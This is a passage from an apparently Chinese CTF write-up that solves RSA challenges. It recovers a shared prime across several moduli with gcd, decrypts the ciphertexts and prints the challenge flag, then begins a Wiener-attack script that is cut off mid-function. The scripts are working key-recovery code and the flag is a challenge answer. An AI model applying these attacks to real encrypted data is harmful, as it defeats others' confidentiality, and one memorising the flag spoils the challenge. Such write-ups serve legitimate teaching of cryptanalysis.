19844333358004073542783728196775487079202832688982038135532362073659058674903791697765527614270399097276261983744620537925712167578187109058145015032736796457938148615396547198728652435169126585595701228287449135664667959433491335769206692390262797325133960778920452511673878233190120432257482339068405290918739453464061987163074129048150451046315248186376609350095502130018696275764450248681787926130463463923862832714969425813770847493135627599129546112143050369344208092649256659330284904392961574494907186727388685504929586018639846040474616307662546605623294842316524163106100888851228858194942825157286544846177</span></span><br><span class="line"><span class="string">c = 9531264751315473345056673937611382755236533664089452852716992791452558274873158812669513178040971923528201631609089069182049526587423864397527252061341857426422965190913745048414029690931254119437249218321954899956104589066479231204536856131403590472063496956452030342299863907499976917750846369802185896519725837163530049157920978007252920334447236842959033879772444475877613295594785710745889554296655932909212643500877218304116451889820444820534937901427158918411546484157737612926382420354101675658160847653151539420222526999426483473829341628599881460824765758346670633385844187252696874025582747177333702736465</span></span><br><span class="line"><span class="string">n = 16956880944655068255446705024149899655327230949463546092744762226005904114738078692036960935391303255804754787864713189658290361949509917704853428701870609882427423574672772606814823959758208695540116440342488334213300943604780971422918744381486937517952553797134323570131582724393100092308466968491068503301604506186521656059375518680612292667310641047190088814753025794048591445267711939066523165042651430468971452726568222388482323097260496415484997546126185688914792795834046855221759289007609518312601640548469651358391745947588643697900883634533872314566389446271647587564348026861264979727062157272541149018781</span></span><br><span class="line"><span class="string">c = 16110326928338602237561005337578085623028116490564329920738844771341250444164294693848130674347672763073995755532723894042946521372321947507527854966013459795492930736187058535665041545095683801386814190612817128504426590828954205050425979880047802547011117626354405687170961272200066258220699329112978151044633994329352673342582175349200008181837211288847301836681860817044391028992501763375849046751094019224570802498414368189170656992427042010362385494565216988561215657424755648213390551881450141899860811844684546992754530755092358644968088017107313907435586729574798046187046145596726569637758312033849476689378</span></span><br><span class="line"><span class="string">n = 16472195897077185060734002588086375750797253422014472876266294484788862733424113898147596402056889527985731623940969291811284437034420929030659419753779530635563455664549165618528767491631867637613948406196511848103083967995689432928779805192695209899686072900265108597626632371718430059561807147486376536203800038054012500244392964187780217667805308512187849789773573138494622201856638931435423778275004491853486855300574479177472267767506041000072575623287557610576406578525902565241580838652860552046216587141709709405062150243990097835181557208274750462554811004137033087430556692966525170882625891516050207318491</span></span><br><span class="line"><span class="string">c = 11867731823522211833301190385669833752050387304375114576570892885641949969365352586215693183003550684262313893105989683214739695968039039944442567581277252581988489020834299896625977474857889570528169919064941042132119301236852358823696947330423679033138054012027878783478922023431469564210485180679933264749281963405243082505688901662659030897104957499953192201440290084373968716271056483463909282407034181891901928790601973222643210525000717355062752079302291729448234374709852429885984987094307177760741403086538949190424454337896501402430653783597070178968921411867485584517214777073301007918941216316241784521708</span></span><br><span class="line"><span class="string">n = 13890749889361612188368868998653029697326614782260719535555306236512452110708495623964530174188871342332417484996749651846510646453983388637377706674890018646246874688969342600780781646175634455109757266442675502522791531161284420286435654971819525519296719668701529481662071464145515727217108362496784024871976015116522898184301395037566514980846499856316532479656908169681719288258287756566886281183699239684997698487409138330229321935477734921670373632304542254938831218652340699024011371979519574576890581492623709896310465567043899767342676912434857372520308852745792360420376574037705943820090308501053778144141</span></span><br><span class="line"><span class="string">c = 6250115196713939477947942995075509357173312813431601073354390451609559579925704891503987992181988654989477525811826607070378476102616752398280691012244301950194800995432882828020405062344160270290542566163969692748126314259624623341922057435728127596172871894887055305291345372720594481096374310285437492746765510292863238933163142677773310305789984897974266961231555124787205980411992251387207335655129551950825339766848166539671565212408741432649813058363660321480995187545006718837863674527475323414266732366507905974800565463011676462244368010182725161416783875646259625352308599198614681446394427674340328493047</span></span><br><span class="line"><span class="string">n = 21457499145521259498911107987303777576783467581104197687610588208126845121702391694574491025398113729462454256070437978257494064504146718372095872819969887408622112906108590961892923178192792218161103488204912792358327748493857104191029765218471874759376809136402361582721860433355338373725980783308091544879562698835405262108188595630215081260699112737457564998798692048522706388318528370551365364702529068656665853097899157141017378975007689790000067275142731212069030175682911154288533716549782283859340452266837760560153014200605378914071410125895494331253564598702942990036163269043699029806343766286247742865671</span></span><br><span class="line"><span class="string">c = 6269656777204332618433779865483197625538144405832409880710764183039800286008967127279281167109250083159801218370191973055663058165456565194979210256278526713608759141588082614531352489547674696723140599892318118960648862531538435596775798128845789504910467783731144808685373807716609662688064728614003904579841055786083326311313295311152563668422289435606771091246147867715987583149743032723028324394173498623642539175178996531881058274717907066845565199058931743481410454382746158558886667761300257488769795092777021292335562818583719708133179974425584610403335487082478848975656282384575767178925517257692365828720</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>已知多组 n c 和 e=65537 e较大</p>
<p>公共因子攻击 </p>
<p>使用同一个(m,e) 使用较多组N加密后的多组(n,c) 可以循环求解这些n的最大公约数，如果存在 </p>
<p>gcd(Ni,Nj)!=1 则可顺利分解Ni和Nj 从而还原明文</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">17524722204224696445172535263975543817720644608816706978363749891469511686943372362091928951563219068859089058278944528021615923888948698587206920445508493551162845371086030869059282352535451058203615402089133135136481314666971507135484450966505425514285114192275051972496161810571035753943880190780759479521486741046704043699838021850105638224212696697865987677760179564370167062037563913329993433080123575434871852732981112883423565015771421868680113407260917902892944119552200927337996135278491046562185003012971570532979090484837684759828977460570826320870379601193678304983534424368152743368343335213808684523217</span></span><br><span class="line">c1 = <span class="number">6870605439714128574950893771863182370595667973241984289208050776870220326525943524507319708560433091378319367164606150977103661770065561661544375425887970907060665421562712515902428061727268441585629591525591001533188276465911918724808701356962871139957343861919730086334623932624184172272488406793955068827527130338853980609365042071290967556159598511667974987218999253443575482949258292953639729393456515185185102248985930422080581185292420347510600574229080211050520146551505605537486989306457793451086767402197128573781597156939709237045132856159368959981648969874765462190363842275826077556314448408825308218451</span></span><br><span class="line">n2 = <span class="number">24974121071274650888046048586598797033399902532613815354986756278905133499432183463847175542164798764762683121930786715931063152122056911933710481566265603626437742951648885379847799327315791800670175616973945640322985175516271373004547752061826574576722667907302681961850865961386200909397231865804894418194711076667760169256682834206788730947602211228930301853348503098156592000286467190760378847541148772869356389938999094673945092387627113807899212568399028514283219850734634544982646070106811651490010946670117927664594365986238107951837041859682547029079035013475238052160645871718246031144694712586073789250183</span></span><br><span class="line">c2 = <span class="number">10324627733161143472233272675096997859064721978612320424254305978486200326061730105384511258706433940176741256952824288120499229240005823611541292676234913505775165761543820764046537413943393325463602612485849366939102550336256797820440347815027443410399157963547486098366749815425187247171697678576246606105486928212486117878157055321965270364583625270716186820068538749425299073309429589410882809098930213978117176627031795312102177342499674234163614021182116065492884880492891668658240362567156235958605768725892407536211503981819707919444725863397622629226309480836486427388484176463279384813974310500625102568341</span></span><br><span class="line">n3 = <span class="number">14215826065753265334521416948225868542990756976323308408298887797364519400310818641526401662106853573185085731682502059761982246604277475488691297554851873224516934619888327644352138127883043558424300092247604877819821625587944308487310522092440517150600171819145803937177931473336108429889165189521078678397694303305705260759351843006130968234071638035667854938070597400634242396852782331461576526836227336952718230741560369621645218729592233657856104560425642219241082727756696967324334634822771842625681505869025740662258929200756109704988223034840699133778958569054445520305361142302393767439478256174414187983763</span></span><br><span class="line">c3 = <span class="number">415916446053083522663299405080903121619846594209033663622616979372099135281363175464579440520262612010099820951944229484417996994283898028928384268216113118778734726335389504987546718739928112684600918108591759061734340607527889972020273454098314620790710425294297542021830654957828983606433731988998097351888879368160881316237557097381718444193741788664735559392675419489952796677690968481917700683813252460912749931286739585465657312416977086336732056497161860235343155953578618273940135486362350057858779130960380833359506761436212727289297656191243565734621757889931250689354508999144817518599291078968866323093</span></span><br><span class="line">n4 = <span class="number">12221355905532691305226996552124162033756814028292708728711809229588190407700199452617060657420166395065565154239801465361510672853972152857415394695376825120759202857555325904640144375262531345320714166285999668052224661520834318497234299585219832943519644095197479639328120838919035625832361810964127485907587199925564724081163804724975965691571850962714258888527902920462746795712011579424322515292865504642938090200503979483095345893697972170153990274670257331483858538617460680462369680572833191232126527727222302641204529110948993583190295067970240051042000918629138767209918572311469915774910003970381965123241</span></span><br><span class="line">c4 = <span class="number">2248834602646305164283014556051672824689884721514190813323189875541899566338153534858709617544459297836048770439230174669883719627734394673012731609952869246171300132019334542245094425654362711870373095782083791160029789553806741967408922001051006100049326921742208757147339981269528740944842177729701945606827918253016001436218891580980192743564642120923356793292885805519110411357830040053435569937296612987581482128241218218550319154933831743819546558930918761162723110000328532730751591375727881221199739397698390594797621758011191224528339478784930214820615602510460640307707682865125229937141010351138099874025</span></span><br><span class="line">n5 = <span class="number">18152103454920389919231636321286527841833809319334215885641536161086810144890443857211776387914779781628740172079478910188540146498426564211851629962338413488555121865779016981727229209606498886170396500155102635962395243364899026418106378234307821492609778555173516000309435730752571818439328803899462791834490025768785383592935046996428331508608555503567191807692523852530836008436655164751054189301721070209363416058642811329040202582026786024825518381761299547703962502636888833428457116986351812252188468878701301184044948733274488264320930936362549028124581962244201377136969591119942276742760215403738913067567</span></span><br><span class="line">c5 = <span class="number">2797812094994121597295362327809389195134238119144547570610194659000554967367804835006774413888965325870488368112707535584687083342412367127561646136089638402907513075405746055834487062923240856950047936297155455745928810738711368950139327254040579266046642851362228893522740216519732851152162928545416236075387903789535000820423985522550638100049857678600662008021574841083416323980817348573062083159710189689337626277009675683473560325178417766400002763719953723259300977655801234386662217462862844994462505601804422871991694828697337752697234180117437785537788728412520613916334045368736691714704501962513954509705</span></span><br><span class="line">n6 = <span class="number">22877887459293720334652698748191453972019668578065068224653972884599636421200068659750242304040301306798039254241668648594556654589309801728248683586229288074709849246660525799452637187132633064172425677552176203292787732404537215347782229753837476655088638984496409603054524994383358547132112778403912563916886533181616856401929346567686400616307916690806467019665390260267596320840786982457521423178851498130935577260638269429250197050326097193841333205073650802709022947551398142692735680419453533128176592587955634333425401930362881423044363132586170013458300714163531162544301477356808388416864173949089028317961</span></span><br><span class="line">c6 = <span class="number">12271947322974809255127222556723394446467844330408506340843897575503534175121932185624776713618037572593449207329510171212097269297133492090526270770286000839978630002819714376964416081198925899119135271459404333829811516667576167576916805217016117373027245648473458331936273975110163065432285322832123169216976420362833557809289561705091817949915218278430834098156335989014645979633658818904753942786129126233956314517292746008579152368541316795082120147520597254020266752859205131887527661767589367756335766220841483940854397440079467053684289006956034944336788288196391829411432383541473132962783883758561108297747</span></span><br><span class="line">n7 = <span class="number">19844333358004073542783728196775487079202832688982038135532362073659058674903791697765527614270399097276261983744620537925712167578187109058145015032736796457938148615396547198728652435169126585595701228287449135664667959433491335769206692390262797325133960778920452511673878233190120432257482339068405290918739453464061987163074129048150451046315248186376609350095502130018696275764450248681787926130463463923862832714969425813770847493135627599129546112143050369344208092649256659330284904392961574494907186727388685504929586018639846040474616307662546605623294842316524163106100888851228858194942825157286544846177</span></span><br><span class="line">c7 = <span class="number">9531264751315473345056673937611382755236533664089452852716992791452558274873158812669513178040971923528201631609089069182049526587423864397527252061341857426422965190913745048414029690931254119437249218321954899956104589066479231204536856131403590472063496956452030342299863907499976917750846369802185896519725837163530049157920978007252920334447236842959033879772444475877613295594785710745889554296655932909212643500877218304116451889820444820534937901427158918411546484157737612926382420354101675658160847653151539420222526999426483473829341628599881460824765758346670633385844187252696874025582747177333702736465</span></span><br><span class="line">n8 = <span class="number">16956880944655068255446705024149899655327230949463546092744762226005904114738078692036960935391303255804754787864713189658290361949509917704853428701870609882427423574672772606814823959758208695540116440342488334213300943604780971422918744381486937517952553797134323570131582724393100092308466968491068503301604506186521656059375518680612292667310641047190088814753025794048591445267711939066523165042651430468971452726568222388482323097260496415484997546126185688914792795834046855221759289007609518312601640548469651358391745947588643697900883634533872314566389446271647587564348026861264979727062157272541149018781</span></span><br><span class="line">c8 = <span class="number">16110326928338602237561005337578085623028116490564329920738844771341250444164294693848130674347672763073995755532723894042946521372321947507527854966013459795492930736187058535665041545095683801386814190612817128504426590828954205050425979880047802547011117626354405687170961272200066258220699329112978151044633994329352673342582175349200008181837211288847301836681860817044391028992501763375849046751094019224570802498414368189170656992427042010362385494565216988561215657424755648213390551881450141899860811844684546992754530755092358644968088017107313907435586729574798046187046145596726569637758312033849476689378</span></span><br><span class="line">n9 = <span class="number">16472195897077185060734002588086375750797253422014472876266294484788862733424113898147596402056889527985731623940969291811284437034420929030659419753779530635563455664549165618528767491631867637613948406196511848103083967995689432928779805192695209899686072900265108597626632371718430059561807147486376536203800038054012500244392964187780217667805308512187849789773573138494622201856638931435423778275004491853486855300574479177472267767506041000072575623287557610576406578525902565241580838652860552046216587141709709405062150243990097835181557208274750462554811004137033087430556692966525170882625891516050207318491</span></span><br><span class="line">c9 = <span class="number">11867731823522211833301190385669833752050387304375114576570892885641949969365352586215693183003550684262313893105989683214739695968039039944442567581277252581988489020834299896625977474857889570528169919064941042132119301236852358823696947330423679033138054012027878783478922023431469564210485180679933264749281963405243082505688901662659030897104957499953192201440290084373968716271056483463909282407034181891901928790601973222643210525000717355062752079302291729448234374709852429885984987094307177760741403086538949190424454337896501402430653783597070178968921411867485584517214777073301007918941216316241784521708</span></span><br><span class="line">n10 = <span class="number">13890749889361612188368868998653029697326614782260719535555306236512452110708495623964530174188871342332417484996749651846510646453983388637377706674890018646246874688969342600780781646175634455109757266442675502522791531161284420286435654971819525519296719668701529481662071464145515727217108362496784024871976015116522898184301395037566514980846499856316532479656908169681719288258287756566886281183699239684997698487409138330229321935477734921670373632304542254938831218652340699024011371979519574576890581492623709896310465567043899767342676912434857372520308852745792360420376574037705943820090308501053778144141</span></span><br><span class="line">c10 = <span class="number">6250115196713939477947942995075509357173312813431601073354390451609559579925704891503987992181988654989477525811826607070378476102616752398280691012244301950194800995432882828020405062344160270290542566163969692748126314259624623341922057435728127596172871894887055305291345372720594481096374310285437492746765510292863238933163142677773310305789984897974266961231555124787205980411992251387207335655129551950825339766848166539671565212408741432649813058363660321480995187545006718837863674527475323414266732366507905974800565463011676462244368010182725161416783875646259625352308599198614681446394427674340328493047</span></span><br><span class="line">n11 = <span class="number">21457499145521259498911107987303777576783467581104197687610588208126845121702391694574491025398113729462454256070437978257494064504146718372095872819969887408622112906108590961892923178192792218161103488204912792358327748493857104191029765218471874759376809136402361582721860433355338373725980783308091544879562698835405262108188595630215081260699112737457564998798692048522706388318528370551365364702529068656665853097899157141017378975007689790000067275142731212069030175682911154288533716549782283859340452266837760560153014200605378914071410125895494331253564598702942990036163269043699029806343766286247742865671</span></span><br><span class="line">c11 = <span class="number">6269656777204332618433779865483197625538144405832409880710764183039800286008967127279281167109250083159801218370191973055663058165456565194979210256278526713608759141588082614531352489547674696723140599892318118960648862531538435596775798128845789504910467783731144808685373807716609662688064728614003904579841055786083326311313295311152563668422289435606771091246147867715987583149743032723028324394173498623642539175178996531881058274717907066845565199058931743481410454382746158558886667761300257488769795092777021292335562818583719708133179974425584610403335487082478848975656282384575767178925517257692365828720</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>=[n1,n2,n3,n4,n5,n6,n7,n8,n9,n10,n11]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">        <span class="built_in">print</span> (i,j)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span> (gmpy2.gcd(<span class="built_in">list</span>[i],<span class="built_in">list</span>[j]))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;error &quot;</span>,i)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 10</span></span><br><span class="line"><span class="comment"># 10 2 得到最大公约数 即 p的值 也就是n3和n11 然后得到q</span></span><br><span class="line">p = <span class="number">147352146484643764031622970604294889624856525072751495442791038251325198568446104214691837421831622655415627526708110986526177662910836604556867226815780490826061784656230373978115117669691022691171484914452586975269776325816859478861737379536769555626991492537714713353640978988383143423169600280639641367257</span></span><br><span class="line"><span class="comment"># 147352146484643764031622970604294889624856525072751495442791038251325198568446104214691837421831622655415627526708110986526177662910836604556867226815780490826061784656230373978115117669691022691171484914452586975269776325816859478861737379536769555626991492537714713353640978988383143423169600280639641367257</span></span><br><span class="line">q = n // p</span><br><span class="line"><span class="comment"># q = 145620540028966886298045317397287868277630293996068891354300317171163102394654200566953231092408905263360354033218015978179750596319737548042877478920021627865879232380251675549484248501442557296855347664700439372652566814092340845895392836187134160213644651413927944852259410982734184261341134137408057812703</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#然后就可以得到 d </span></span><br><span class="line">phi = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># d = 13890061244023893571292626230272601124822036844237064294966074036675058019791907857403118959694364662079667353701455067970702476349602825582766915002432252062550689197380881989827812882976807254882992117179688119734038732351242714622278205588117411764221764053934934278123689015741747030943604509682507220348171855015343690151337521301952568174964433189827488310718462972123894168759123552530854537825838122774375389629170816976667180145049794067489681930581496862191275622418116611080426001807586441445849047128039690010523429346460391541771350701269810340239529987096894353991898811080385219506792263057151207002497</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在根据d 去求每个的c</span></span><br><span class="line">t = q*p</span><br><span class="line"><span class="built_in">list</span>=[c1,c2,c3,c4,c5,c6,c7,c8,c9,c10,c11]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">    <span class="built_in">print</span> (i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="built_in">pow</span>(<span class="built_in">list</span>[i],d,t))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error &quot;</span>,i)</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">得到每一个c</span><br><span class="line">c0</span><br><span class="line"><span class="number">5583931503863158448241087778703219729339386877469101650310614267193808645636265780847525270311408662798764494806316792322496772136730882627401956548894582378252647193355732477827456217891613661301980719412550764225447589548809263540915638215544587644746386272967220895968285195684142843647434636534481350856410537207952050965202269455207000853776258252498786445597692354846460259459011433273529099315278115181189426826021073634038282586042758802255159539251744624846425060273914619959089145166186263379268138874174796886123671236544094480824028694661203027024619966084187345594222929651646564476107965383954412435984</span></span><br><span class="line">c1</span><br><span class="line"><span class="number">17889276545398631109985181638075683803666431785407101600436864957616694683569707270903393875295971232004587376322302965260410520501926482253754723159970897416903562022151277550900269792835960721536517928979493572013869752778546707374175957488270200511322881603287930669531221928801843596512070798750295829093868396955003371397967579054767815761130634065444611350656930699963774301141534151599485074550902786461778739084156891486192925774617711065551034004230705907263510387531360551232365340600209203001303918232038821562990305554223273023734302456574527633037037502090726974759626590416964672293931079249637991274807</span></span><br><span class="line">c2</span><br><span class="line"><span class="number">1919303950923990301726092254331108873242521839121646815470639244188317328309694223389909770602853658233546892885121453151964135130873355308839503241193471537929483185859713641325167618250562043522478282534144550850594566643165893025080068633606400022233757710777388416237979384760710964007221147708866762708629866432177005688252216950012286098437990916886219826876935889191342058448950937150541038391788698522041824123925953482340249663213350360417338611716099173404200129764891141839698075343076791890574707491339085711872354878423991799659809600594015341475368054292224354236920521530614364120121697617638462890589</span></span><br><span class="line">c3</span><br><span class="line"><span class="number">15819662230428218945146053851253894429245696511467639405558494810033573174765245205575707990537246997767537225197025031858327494031593337065038660571361398523300542054741132961462297024093500820339195465183004666075661684777565330193923764435435168589163967429767951576451155187963295050564704838868144169526109627667588225338575682532532259140367840339279347253006747470116840354327548941381883752757179247373199292721386476852503947989521479550136358352095998740342043129318511336378603140752957689951019028518420971161260853457608994706151634068382461167748119823459448209255450151019540053434115155746471768758223</span></span><br><span class="line">c4</span><br><span class="line"><span class="number">9912498270048767364937518815088488991017394607781697785154049219576655387213772951061990603603257053248555940042252123521896423945383884115086410019906422461658200497190844980087467834352830645285294672197753723950567279068303417639211098708701705920214950226998970484494492433303596538380528615214754522848882106080937752455436369281541039644810938245372093925127895738664996561522895882573919590981827260378306369665139096476210577740715748606198901230504859115058391700663262864833149196407397847463632082548044765997958811706368460484929856438781493904302944113212251913941059679216276147180219574862660939793212</span></span><br><span class="line">c5</span><br><span class="line"><span class="number">19256037609810856260101951044981441781117528769047030944163855397566234154186632638298908242407660984966861116730046367790637776325252929011960173443587470943679270746407230092486443713769359588651892731958484832393535163466092096060689019573911721642459263449724805795301398729186160505554566366995596371628778559502323439639340301427089672435097223724375396426081908292419478358246772813692133173842148694824724420827167133519122103490955251963651808959652122831068341685627972448103657495100263069990559529220734784528621767182080676393860589410034175942325516581105206675530132486763011188291716144800871045950029</span></span><br><span class="line">c6</span><br><span class="line"><span class="number">20853005096799609956787439577711938116928131852913653884569939872996169131478494107630954813563701963235599506424021498968861609858530382814043597413322113990358387371692314494726890772762603762186424441102457951040437225381340560220037763168627750819553250347865837117715208197263603561499629011920027351866827036567002613657496546509558769265991039126958678683270153333739584013945204184298804497856841055668293980129249602693426129130542791507145366435167902318706570857459009459273021766106516922186355672232155982327174609939626060301076878646548075597966639529559357098109949641111458978656097070245769838190432</span></span><br><span class="line">c7</span><br><span class="line"><span class="number">7766943369159277457688559612135855764282943607086412107316751512719004229867549657804170667177725548208395856948998387112648283436110293459752480792030938440478886375096137616604544391945701044004842429540661600163516598943024168663092728786827935791884016514261155436786516245270802466511976522094694964433368312498109702300804296101419970970233518372347332735527060417948683007902972009195496911122949282777477506589655882306158722560506328545619683359535513525600453189468257112268020819460602197873781931012975661830532458594065083333929186652582309083878502061715370860147523291884212192950343843314289120871850</span></span><br><span class="line">c8</span><br><span class="line"><span class="number">16929615456860049187155331668830881310756198279467226637344416034488859577993256231147734684466900099330043820073076737952119911203721533098997369570656096561996199411163296040127981822205083076476016043235804207441382042547760895720472312222317247781994920125002927326777536198862861957911254815119717280130841516708626547190126590286714725420637352197479059475562943293790711133162378929627077926511567326259088749567159599902070456083023628532680433526793740349943091367370797505193942676361991134211183555786547040830174070876224547967646340199991763473242461846788788168604806594905021464515742730805637619384636</span></span><br><span class="line">c9</span><br><span class="line"><span class="number">11711031069741612148675837088288060089423169664551396153615158703897862859800076345900728345442661150960428389347748869175803214059821781858146871741620298147705921117388689675907133957172866730389446826755971397426800080972249270312761308973152815182174416461996249365341948300139041789646657303330688337432623593775327364059734847195415788148412463650665348316613841346600322586447925839809352042664906410960203667719610787758715539962179593114314449840250688174133403218599150466782655109079732378888230078350274753315565443725878901524716270193579115963303486803347730461897150303142769539854139696662653794202153</span></span><br><span class="line">c10</span><br><span class="line"><span class="number">105729052004695709707494302369697273267327705350547207256718415856738426065458834414702886105339833110865496603092491943242543406994199199351757456420893889035687401880907389</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#然后得到的c11是最小的 </span></span><br><span class="line"><span class="comment">#转成hex在转字符串试试</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="number">105729052004695709707494302369697273267327705350547207256718415856738426065458834414702886105339833110865496603092491943242543406994199199351757456420893889035687401880907389</span>)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#得到flag</span></span><br><span class="line"><span class="comment">#b&#x27;moectf&#123;it_is_re@lly_@_signin_level_cryPto_ch@ll@nge_ng92WPIBung92WPIBun&#125;&#x27;</span></span><br></pre></td></tr></table></figure>





<h4 id="giant-e-【高指数e】"><a href="#giant-e-【高指数e】" class="headerlink" title="giant_e 【高指数e】"></a>giant_e 【高指数e】</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    flag = fs.read().strip()</span><br><span class="line"> </span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x609778981bfbb26bb93398cb6d96984616a6ab08ade090c1c0d4fedb00f44f0552a1555efec5cc66e7960b61e94e80e7483b9f906a6c8155a91cdc3e4917fa5347c58a2bc85bb160fcf7fe98e3645cfea8458ea209e565e4eb72ee7cbb232331a862d8a84d91a0ff6d74aa3c779b2b129c3d8148b090c4193234764f2e5d9b2170a9b4859501d07c0601cdd18616a0ab2cf713a7c785fd06f27d68dff24446d884644e08f31bd37ecf48750e4324f959a8d37c5bef25e1580851646d57b3d4f525bc04c7ddafdf146539a84703df2161a0da7a368675f473065d2cb661907d990ba4a8451b15e054bfc4dd73e134f3bf7d8fa4716125d8e21f946d16b7b0fc43</span></span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag,<span class="string">&quot;big&quot;</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(n) <span class="comment"># 0xbaa70ba4c29eb1e6bb3458827540fce84d40e1c966db73c0a39e4f9f40e975c42e02971dab385be27bd2b0687e2476894845cc46e55d9747a5be5ca9d925931ca82b0489e39724ea814800eb3c0ea40d89ebe7fe377f8d3f431a68d209e7a149851c06a4e67db7c99fcfd9ec19496f29d59bb186feb44a36fe344f11d047b9435a1c47fa2f8ed72f59403ebb0e439738fd550a7684247ab7da64311690f461e6dce03bf2fcd55345948a3b537087f07cd680d7461d326690bf21e39dff30268cb33f86eeceff412cd63a38f7110805d337dcad25e6f7e3728b53ca722b695b0d9db37361b5b63213af50dd69ee8b3cf2085f845d7932c08b27bf638e98497239</span></span><br><span class="line"><span class="built_in">print</span>(c) <span class="comment"># 0x45a9ce4297c8afee693d3cce2525d3399c5251061ddd2462513a57f0fd69bdc74b71b519d3a2c23209d74fcfbcb6b196b5943838c2441cb34496c96e0f9fc9f0f80a2f6d5b49f220cb3e78e36a4a66595aa2dbe3ff6e814d84f07cb5442e2d5d08d08aa9ccde0294b39bfde79a6c6dcd2329e9820744c4deb34a039da7933ddf00b0a0469afb89cba87490a39783a9b2f8f0274f646ca242e78a326dda886c213bc8d03ac1a9150de4ba08c5936c3fe924c8646652ef85aa7ac0103485f472413427a0e9d9a4d416b99e24861ca8499500c693d7a07360158ffffa543480758cafff2a09a9f6628f92767764fa026d48a9dd899838505ae16e38910697f9de14</span></span><br></pre></td></tr></table></figure>

<p>已知 n c e 且e为大数</p>
<p>Wiener Attack 类型</p>
<p>wp参考 <a href="https://github.com/liuhack/writeups/blob/master/2018/picoCTF/Super_safe_RSA2/README.md">https://github.com/liuhack/writeups/blob/master/2018/picoCTF/Super_safe_RSA2/README.md</a></p>
<p>脚本 <a href="https://gist.github.com/mananpal1997/73d07cdc91d58b4eb5c818aaab2d38bd">https://gist.github.com/mananpal1997/73d07cdc91d58b4eb5c818aaab2d38bd</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">0xbaa70ba4c29eb1e6bb3458827540fce84d40e1c966db73c0a39e4f9f40e975c42e02971dab385be27bd2b0687e2476894845cc46e55d9747a5be5ca9d925931ca82b0489e39724ea814800eb3c0ea40d89ebe7fe377f8d3f431a68d209e7a149851c06a4e67db7c99fcfd9ec19496f29d59bb186feb44a36fe344f11d047b9435a1c47fa2f8ed72f59403ebb0e439738fd550a7684247ab7da64311690f461e6dce03bf2fcd55345948a3b537087f07cd680d7461d326690bf21e39dff30268cb33f86eeceff412cd63a38f7110805d337dcad25e6f7e3728b53ca722b695b0d9db37361b5b63213af50dd69ee8b3cf2085f845d7932c08b27bf638e98497239</span></span><br><span class="line">c = <span class="number">0x45a9ce4297c8afee693d3cce2525d3399c5251061ddd2462513a57f0fd69bdc74b71b519d3a2c23209d74fcfbcb6b196b5943838c2441cb34496c96e0f9fc9f0f80a2f6d5b49f220cb3e78e36a4a66595aa2dbe3ff6e814d84f07cb5442e2d5d08d08aa9ccde0294b39bfde79a6c6dcd2329e9820744c4deb34a039da7933ddf00b0a0469afb89cba87490a39783a9b2f8f0274f646ca242e78a326dda886c213bc8d03ac1a9150de4ba08c5936c3fe924c8646652ef85aa7ac0103485f472413427a0e9d9a4d416b99e24861ca8499500c693d7a07360158ffffa543480758cafff2a09a9f6628f92767764fa026d48a9dd899838505ae16e38910697f9de14</span></span><br><span class="line">e = <span class="number">0x609778981bfbb26bb93398cb6d96984616a6ab08ade090c1c0d4fedb00f44f0552a1555efec5cc66e7960b61e94e80e7483b9f906a6c8155a91cdc3e4917fa5347c58a2bc85bb160fcf7fe98e3645cfea8458ea209e565e4eb72ee7cbb232331a862d8a84d91a0ff6d74aa3c779b2b129c3d8148b090c4193234764f2e5d9b2170a9b4859501d07c0601cdd18616a0ab2cf713a7c785fd06f27d68dff24446d884644e08f31bd37ecf48750e4324f959a8d37c5bef25e1580851646d57b3d4f525bc04c7ddafdf146539a84703df2161a0da7a368675f473065d2cb661907d990ba4a8451b15e054bfc4dd73e134f3bf7d8fa4716125d8e21f946d16b7b0fc43</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rational_to_contfrac</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="comment"># Converts a rational x/y fraction into a list of partial quotients [a0, ..., an]</span></span><br><span class="line">    a = x // y</span><br><span class="line">    